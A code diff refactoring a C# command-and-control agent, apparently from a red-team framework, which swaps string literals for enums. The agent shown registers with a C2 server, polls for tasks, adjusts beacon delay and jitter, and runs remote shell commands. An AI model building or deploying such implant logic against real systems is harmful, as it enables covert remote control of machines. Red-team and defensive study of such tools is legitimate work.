@@ -52,10 +52,10 @@ var jitter = baseConfig.Jitter;
 // Contact request 
 var registerRequest = new C2Request
 {
-    Reason = "register",
+    Reason = C2RequestReason.Register,
     AgentId = baseConfig.AgentId ?? string.Empty,
     ConfigId = baseConfig.AgentConfigId ?? string.Empty,
-    AgentStatus = "active",
+    AgentStatus = AgentStatus.Active,
     Message = JsonSerializer.Serialize(agentInfo)
 };
 
@@ -81,7 +81,7 @@ while (true)
                 Environment.Exit(1);
             }
 
-            var taskRequest = new C2Request { Reason = "task", AgentId = baseCommunicationService.BaseConfig.AgentId, AgentStatus = "active" };
+            var taskRequest = new C2Request { Reason = C2RequestReason.Task, AgentId = baseCommunicationService.BaseConfig.AgentId, AgentStatus = AgentStatus.Active };
             var result = await baseCommunicationService.SimplePostAsync($"/", JsonSerializer.Serialize(taskRequest));
 
             if (!string.IsNullOrWhiteSpace(result))
@@ -100,7 +100,7 @@ while (true)
 
                     Console.WriteLine(JsonSerializer.Serialize(task));
 
-                    if (!string.IsNullOrWhiteSpace(task.Module) && task.Status is not "Running")
+                    if (!string.IsNullOrWhiteSpace(task.Module) && task.Status is not AgentTaskStatus.Running)
                     {
                         task.QueueRunningStatus(messageQueue, messageQueueLock);
 
@@ -142,7 +142,7 @@ while (true)
                             taskQueue.Enqueue(task);
                     }
 
-                    if (task!.Status is not "Running")
+                    if (task!.Status is not AgentTaskStatus.Running)
                         task!.QueueQueuedStatus(messageQueue, messageQueueLock);
                 }
 
@@ -164,8 +164,8 @@ while (true)
                     var taskUpdateRequest = new C2Request
                     {
                         AgentId = baseCommunicationService.BaseConfig.AgentId,
-                        AgentStatus = "Active",
-                        Reason = "response",
+                        AgentStatus = AgentStatus.Active,
+                        Reason = C2RequestReason.Response,
                         Message = JsonSerializer.Serialize(agentTask)
                     };
 
@@ -202,15 +202,15 @@ async Task HandleTask(AgentTask task)
     {
         // When the SetDelay TaskType is set, the 2nd param always needs a value
         // -1 will set Delay only and skip changing jitter
-        case "SetDelay":
+        case AgentTaskType.SetDelay:
             delay = Convert.ToInt32(task.Command.Parameters[1]);
             var jitterParam = Convert.ToInt32(task.Command.Parameters[2]);
             jitter = jitterParam != -1 ? jitterParam : jitter;
             break;
-        case "SetJitter":
+        case AgentTaskType.SetJitter:
             jitter = Convert.ToInt32(task.Command.Parameters[1]);
             break;
-        case "ShellCommand":
+        case AgentTaskType.ShellCommand:
             await Task.Run(async () =>
             {
                 task.Command.CommandStarted = DateTime.UtcNow;
@@ -218,7 +218,7 @@ async Task HandleTask(AgentTask task)
                 task.Command.CommandCompleted = DateTime.UtcNow;
             });
             break;
-        case "Exit":
+        case AgentTaskType.Exit:
             break;
     }
 
